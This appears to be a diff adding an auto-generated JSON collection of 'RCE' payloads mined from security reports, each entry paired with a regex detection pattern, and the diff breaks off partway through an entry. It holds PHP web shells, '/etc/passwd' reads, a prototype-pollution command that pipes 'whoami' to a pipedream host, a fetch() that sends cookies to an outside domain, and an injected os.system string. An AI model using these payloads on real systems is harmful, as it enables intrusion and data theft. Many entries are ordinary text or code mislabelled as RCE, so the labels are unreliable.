@@ -1,0 +1,886 @@
+{
+  "description": "Custom payloads mined from user-provided files",
+  "author": "CyberShellV2",
+  "version": "1.0.0",
+  "generated_at": "2025-08-24T04:06:07.361175Z",
+  "payloads": [
+    {
+      "category": "RCE",
+      "name": "RCE \"constructor.prototype.sourceURL\": \"\\u20 [2c57c987]",
+      "payload": "\"constructor.prototype.sourceURL\": \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')\"",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\"constructor\\.prototype\\.sourceURL\":\\ \"\\\\u2028\\\\u2029\\\\nglobal\\.process\\.mainModule\\.require\\('child_process'\\)\\.exec\\('whoami\\ \\|\\ curl\\ https://enba5g2t13nue\\.x\\.pipedream\\.net/\\ \\-d@\\-'\\)\"",
+      "tags": [
+        "curl-pipe",
+        "exec-call",
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE \"gzip -dc #{@archive_path} | wc -c\" [4000360c]",
+      "payload": "\"gzip -dc #{@archive_path} | wc -c\"",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\"gzip\\ \\-dc\\ \\#\\{@archive_path\\}\\ \\|\\ wc\\ \\-c\"",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE \"solutionImage\": (uploaded_file, \"<?php  [d84c5860]",
+      "payload": "\"solutionImage\": (uploaded_file, \"<?php system($_GET['cmd']); ?>\", \"image/jpg\")",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\"solutionImage\":\\ \\(uploaded_file,\\ \"<\\?php\\ system\\(\\$_GET\\['cmd'\\]\\);\\ \\?>\",\\ \"image/jpg\"\\)",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE # Running a `git gc` will make importing [934da16a]",
+      "payload": "# Running a `git gc` will make importing pull requests faster.",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\\#\\ Running\\ a\\ `git\\ gc`\\ will\\ make\\ importing\\ pull\\ requests\\ faster\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE #!/bin/bash [71a2c293]",
+      "payload": "#!/bin/bash",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\\#!/bin/bash",
+      "tags": [
+        "bash"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE 'users[photo]': ('backdoor.php', '<?php  [4a5740ad]",
+      "payload": "'users[photo]': ('backdoor.php', '<?php if(isset($_REQUEST[\\'cmd\\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\\'cmd\\']); system($cmd); echo \"</pre>\"; die; }?>', 'application/octet-stream'),",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "'users\\[photo\\]':\\ \\('backdoor\\.php',\\ '<\\?php\\ if\\(isset\\(\\$_REQUEST\\[\\\\'cmd\\\\'\\]\\)\\)\\{\\ echo\\ \"<pre>\";\\ \\$cmd\\ =\\ \\(\\$_REQUEST\\[\\\\'cmd\\\\'\\]\\);\\ system\\(\\$cmd\\);\\ echo\\ \"</pre>\";\\ die;\\ \\}\\?>',\\ 'application/octet\\-stream'\\),",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE ).exec(\"PATCH_ME\") [fe02b315]",
+      "payload": ").exec(\"PATCH_ME\")",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "\\)\\.exec\\(\"PATCH_ME\"\\)",
+      "tags": [
+        "exec-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE /opt/gitlab/embedded/bin/git --git-dir / [31e6e048]",
+      "payload": "/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "/opt/gitlab/embedded/bin/git\\ \\-\\-git\\-dir\\ /var/opt/gitlab/git\\-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\\.git\\ grep\\ \\-\\-ignore\\-case\\ \\-I\\ \\-\\-line\\-number\\ \\-\\-null\\ \\-\\-before\\-context\\ 2\\ \\-\\-after\\-context\\ 2\\ \\-\\-perl\\-regexp\\ \\-e\\ a\\ \\-\\-no\\-index",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE 1- By browsing here https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/por [edb9e10c]",
+      "payload": "1- By browsing here https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=, we're able to see your cookies in the Search field between the lol strings at the beginning and end.",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "1\\-\\ By\\ browsing\\ here\\ https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults\\?osf=\\&ms=lol<esi:vars>\\$\\(HTTP_HEADER\\{Cookie\\}\\)</esi:vars>lol\\&mo=containsall\\&pg=\\&sepg=\\-1\\&fi=\\&fs=\\&ft=\\&pu=1\\&has=\\&as=17%2C0%3B48%2C0\\&saa=ALL\\&po=matchall\\&pi=\\&pc=\\&co=equal\\&ci=\\&p_action=SUBMIT\\&ll=,\\ we're\\ able\\ to\\ see\\ your\\ cookies\\ in\\ the\\ Search\\ field\\ between\\ the\\ lol\\ strings\\ at\\ the\\ beginning\\ and\\ end\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE 2. upload shell.phar file but content as [a48a2793]",
+      "payload": "2. upload shell.phar file but content as  <?php echo system(\"cat /etc/passwd\"); ?>",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "2\\.\\ upload\\ shell\\.phar\\ file\\ but\\ content\\ as\\ \\ <\\?php\\ echo\\ system\\(\"cat\\ /etc/passwd\"\\);\\ \\?>",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE 4 CVE-2025-4123 156 grafana grafana A cr [6952e5ed]",
+      "payload": "4\tCVE-2025-4123\t156\tgrafana\tgrafana\tA cross-site scripting (XSS) vulnerability exists in Grafana caused by combining a client path traversal and open redirect. This allows attackers to redirect users to a website that hosts a frontend plugin that will execute arbitrary JavaScript. This vulnerability does not require editor permissions and if anonymous access is enabled, the XSS will work. If the Grafana Image Renderer plugin is installed, it is possible to exploit the open redirect to achieve a full read SSRF.\\n\\nThe default Content-Security-Policy (CSP) in Grafana will block the XSS though the `connect-src` directive.\t5.16%",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "4\\\tCVE\\-2025\\-4123\\\t156\\\tgrafana\\\tgrafana\\\tA\\ cross\\-site\\ scripting\\ \\(XSS\\)\\ vulnerability\\ exists\\ in\\ Grafana\\ caused\\ by\\ combining\\ a\\ client\\ path\\ traversal\\ and\\ open\\ redirect\\.\\ This\\ allows\\ attackers\\ to\\ redirect\\ users\\ to\\ a\\ website\\ that\\ hosts\\ a\\ frontend\\ plugin\\ that\\ will\\ execute\\ arbitrary\\ JavaScript\\.\\ This\\ vulnerability\\ does\\ not\\ require\\ editor\\ permissions\\ and\\ if\\ anonymous\\ access\\ is\\ enabled,\\ the\\ XSS\\ will\\ work\\.\\ If\\ the\\ Grafana\\ Image\\ Renderer\\ plugin\\ is\\ installed,\\ it\\ is\\ possible\\ to\\ exploit\\ the\\ open\\ redirect\\ to\\ achieve\\ a\\ full\\ read\\ SSRF\\.\\\\n\\\\nThe\\ default\\ Content\\-Security\\-Policy\\ \\(CSP\\)\\ in\\ Grafana\\ will\\ block\\ the\\ XSS\\ though\\ the\\ `connect\\-src`\\ directive\\.\\\t5\\.16%",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE <?php echo system(\"cat /etc/passwd\");?> [8bef5d5f]",
+      "payload": "<?php echo system(\"cat /etc/passwd\");?>",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "<\\?php\\ echo\\ system\\(\"cat\\ /etc/passwd\"\\);\\?>",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE <?php echo system('cat /etc/passwd'); ?> [0c3e28de]",
+      "payload": "<?php echo system('cat /etc/passwd'); ?>",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "<\\?php\\ echo\\ system\\('cat\\ /etc/passwd'\\);\\ \\?>",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE <esi:vars>$(HTTP_HEADER{Cookie})</esi:va [916b9841]",
+      "payload": "<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "<esi:vars>\\$\\(HTTP_HEADER\\{Cookie\\}\\)</esi:vars>",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE @project.import_state.schedule if @proje [00445488]",
+      "payload": "@project.import_state.schedule if @project.import? && !@project.bare_repository_import? && !@project.gitlab_project_migration?",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "@project\\.import_state\\.schedule\\ if\\ @project\\.import\\?\\ \\&\\&\\ !@project\\.bare_repository_import\\?\\ \\&\\&\\ !@project\\.gitlab_project_migration\\?",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Attached is the exploit chain bd-jb as a [ae5454f0]",
+      "payload": "Attached is the exploit chain bd-jb as a .iso file which demonstrates the exploitation of vulnerabilities 1-4 that demonstrates the ability to run arbitrary payloads. Burn the iso image with UDF 2.5 file system. You can send the payload using nc $PS4IP 1337 < payload.bin. The provided payload causes a kernel panic by triggering vulnerability 5 (the file /PWN/0 has been modified to use internal allocation and has a size of 4MB filled with A). Tested on latest firmware 9.00.",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Attached\\ is\\ the\\ exploit\\ chain\\ bd\\-jb\\ as\\ a\\ \\.iso\\ file\\ which\\ demonstrates\\ the\\ exploitation\\ of\\ vulnerabilities\\ 1\\-4\\ that\\ demonstrates\\ the\\ ability\\ to\\ run\\ arbitrary\\ payloads\\.\\ Burn\\ the\\ iso\\ image\\ with\\ UDF\\ 2\\.5\\ file\\ system\\.\\ You\\ can\\ send\\ the\\ payload\\ using\\ nc\\ \\$PS4IP\\ 1337\\ <\\ payload\\.bin\\.\\ The\\ provided\\ payload\\ causes\\ a\\ kernel\\ panic\\ by\\ triggering\\ vulnerability\\ 5\\ \\(the\\ file\\ /PWN/0\\ has\\ been\\ modified\\ to\\ use\\ internal\\ allocation\\ and\\ has\\ a\\ size\\ of\\ 4MB\\ filled\\ with\\ A\\)\\.\\ Tested\\ on\\ latest\\ firmware\\ 9\\.00\\.",
+      "tags": [
+        "netcat"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Blind SQL Injection && Akamai WAF Bypass [cdefbcb5]",
+      "payload": "Blind SQL Injection && Akamai WAF Bypass. Wait for the write-up ;)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Blind\\ SQL\\ Injection\\ \\&\\&\\ Akamai\\ WAF\\ Bypass\\.\\ Wait\\ for\\ the\\ write\\-up\\ ;\\)",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Create new Persistent Volume Claim Since [d1f040b8]",
+      "payload": "Create new Persistent Volume Claim Since the way to scan for one resource was very specific and incompatible with traditional SSRF exploitation tools or scanners, we decided to create some kind of custom workers in bash script. In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers. The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range.",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Create\\ new\\ Persistent\\ Volume\\ Claim\\ Since\\ the\\ way\\ to\\ scan\\ for\\ one\\ resource\\ was\\ very\\ specific\\ and\\ incompatible\\ with\\ traditional\\ SSRF\\ exploitation\\ tools\\ or\\ scanners,\\ we\\ decided\\ to\\ create\\ some\\ kind\\ of\\ custom\\ workers\\ in\\ bash\\ script\\.\\ In\\ order\\ to\\ be\\ able\\ to\\ scan\\ 172\\.16\\.0\\.0/12\\ range\\ faster,\\ we\\ launched\\ 15\\ simultaneously\\ workers\\.\\ The\\ above\\ IP\\ range\\ was\\ chosen\\ just\\ for\\ demonstration\\ purposes\\ and\\ can\\ be\\ adapted\\ to\\ each\\ provider\\ internal\\ IP\\ range\\.",
+      "tags": [
+        "bash"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Here are two additional YAML files that  [d011fc36]",
+      "payload": "Here are two additional YAML files that needs to be in the same directory as scanner.sh Bash",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Here\\ are\\ two\\ additional\\ YAML\\ files\\ that\\ needs\\ to\\ be\\ in\\ the\\ same\\ directory\\ as\\ scanner\\.sh\\ Bash",
+      "tags": [
+        "bash"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Incident Report | 2019-11-24 Account Tak [f338350b]",
+      "payload": "Incident Report | 2019-11-24 Account Takeover via Disclosed Session Cookie",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Incident\\ Report\\ \\|\\ 2019\\-11\\-24\\ Account\\ Takeover\\ via\\ Disclosed\\ Session\\ Cookie",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE Security Team | GitLab Inc. [57a2c338]",
+      "payload": "Security Team | GitLab Inc.",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "Security\\ Team\\ \\|\\ GitLab\\ Inc\\.",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE The payload pollutes the prototype, whic [c3926df2]",
+      "payload": "The payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "The\\ payload\\ pollutes\\ the\\ prototype,\\ which\\ in\\ turn\\ injects\\ Javascript\\ that\\ spawns\\ a\\ shell\\ process,\\ in\\ this\\ case\\ whoami\\ \\|\\ curl\\ https://enba5g2t13nue\\.x\\.pipedream\\.net/\\ \\-d@\\-",
+      "tags": [
+        "curl-pipe",
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE cmd.prepend('/bin/sh -c ') [e4615e83]",
+      "payload": "cmd.prepend('/bin/sh -c ')",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "cmd\\.prepend\\('/bin/sh\\ \\-c\\ '\\)",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE const payload = `0x${'0'.repeat(256-hexI [2ade79af]",
+      "payload": "const payload = `0x${'0'.repeat(256-hexIP.length-2)}${hexIP}.example.com`;",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "const\\ payload\\ =\\ `0x\\$\\{'0'\\.repeat\\(256\\-hexIP\\.length\\-2\\)\\}\\$\\{hexIP\\}\\.example\\.com`;",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE current_user.totp_supported? && current_ [c79d3e2a]",
+      "payload": "current_user.totp_supported? && current_user.totp_disabled?",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "current_user\\.totp_supported\\?\\ \\&\\&\\ current_user\\.totp_disabled\\?",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE data << '0c' # EXTERNALIZABLE | BLOCKDAT [f29c8684]",
+      "payload": "data << '0c'                                           #     EXTERNALIZABLE | BLOCKDATA",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "data\\ <<\\ '0c'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ \\ \\ EXTERNALIZABLE\\ \\|\\ BLOCKDATA",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE data << '0c' # EXTERNALIZABLE | BLOCKDAT [9e8bc592]",
+      "payload": "data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "data\\ <<\\ '0c'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ EXTERNALIZABLE\\ \\|\\ BLOCKDATA",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE draft_id: Parameters.id | Parameters.nil [539f86a5]",
+      "payload": "draft_id: Parameters.id | Parameters.nil,",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "draft_id:\\ Parameters\\.id\\ \\|\\ Parameters\\.nil,",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE fetch('https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/port [0700a03f]",
+      "payload": "fetch('https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "fetch\\('https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults\\?osf=\\&ms=lol<esi:vars>\\$\\(HTTP_HEADER\\{Cookie\\}\\)</esi:vars>lol\\&mo=containsall\\&pg=\\&sepg=\\-1\\&fi=\\&fs=\\&ft=\\&pu=1\\&has=\\&as=17%2C0%3B48%2C0\\&saa=ALL\\&po=matchall\\&pi=\\&pc=\\&co=equal\\&ci=\\&p_action=SUBMIT\\&ll='\\)\\.then\\(function\\ \\(response\\)\\ \\{",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE fetch(`http://localhost?url=http://${pay [f625241e]",
+      "payload": "fetch(`http://localhost?url=http://${payload}.example.com:3000/secret`)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "fetch\\(`http://localhost\\?url=http://\\$\\{payload\\}\\.example\\.com:3000/secret`\\)",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE fetch(`https://www.jr0ch17.com/ato?cooki [da65394a]",
+      "payload": "fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "fetch\\(`https://www\\.jr0ch17\\.com/ato\\?cookies=\\$\\{cookies\\}`\\);",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE for host in $(cat $1); do [87e14da7]",
+      "payload": "for host in $(cat $1); do",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "for\\ host\\ in\\ \\$\\(cat\\ \\$1\\);\\ do",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE if json.empty? && json['error'] [11a4184b]",
+      "payload": "if json.empty? && json['error']",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "if\\ json\\.empty\\?\\ \\&\\&\\ json\\['error'\\]",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE if res && res.code == 200 [70a5c3a4]",
+      "payload": "if res && res.code == 200",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "if\\ res\\ \\&\\&\\ res\\.code\\ ==\\ 200",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE include Msf::Exploit::Powershell [cabaf2c8]",
+      "payload": "include Msf::Exploit::Powershell",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "include\\ Msf::Exploit::Powershell",
+      "tags": [
+        "powershell"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE iwiedler:x:1030:1030::/home/iwiedler:/bi [e0c48c9c]",
+      "payload": "iwiedler:x:1030:1030::/home/iwiedler:/bin/bash",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "iwiedler:x:1030:1030::/home/iwiedler:/bin/bash",
+      "tags": [
+        "bash"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload << '03' # WRITE_METHOD | SERIALI [f9a19aee]",
+      "payload": "payload << '03'                                        #   WRITE_METHOD | SERIALIZABLE",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload\\ <<\\ '03'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ WRITE_METHOD\\ \\|\\ SERIALIZABLE",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload << '0c' # EXTERNALIZABLE | BLOCK [47320d01]",
+      "payload": "payload << '0c'                                        #     EXTERNALIZABLE | BLOCKDATA",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload\\ <<\\ '0c'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ \\ \\ EXTERNALIZABLE\\ \\|\\ BLOCKDATA",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload << '0c' # EXTERNALIZABLE | BLOCK [f0614404]",
+      "payload": "payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload\\ <<\\ '0c'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ EXTERNALIZABLE\\ \\|\\ BLOCKDATA",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload << '0c' # SERIALIZABLE | BLOCKDA [f3d3600f]",
+      "payload": "payload << '0c'                                        #   SERIALIZABLE | BLOCKDATA",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload\\ <<\\ '0c'\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\#\\ \\ \\ SERIALIZABLE\\ \\|\\ BLOCKDATA",
+      "tags": [
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload = 'jk=pyimport%20os;os.system(\"' [d073f498]",
+      "payload": "payload = 'jk=pyimport%20os;os.system(\"'+validCommand+'\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload\\ =\\ 'jk=pyimport%20os;os\\.system\\(\"'\\+validCommand\\+'\"\\);f=function%20f2\\(\\)\\{\\};\\&package=xxx\\&crypted=AAAA\\&\\&passwords=aaaa'",
+      "tags": [
+        "operator-and",
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE payload: <?php echo system(\"cat /etc/pas [9e8fb330]",
+      "payload": "payload: <?php echo system(\"cat /etc/passwd\"); ?>",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "payload:\\ <\\?php\\ echo\\ system\\(\"cat\\ /etc/passwd\"\\);\\ \\?>",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE postgres:x:116:121:PostgreSQL administra [e209965a]",
+      "payload": "postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "postgres:x:116:121:PostgreSQL\\ administrator,,,:/var/lib/postgresql:/bin/bash",
+      "tags": [
+        "bash"
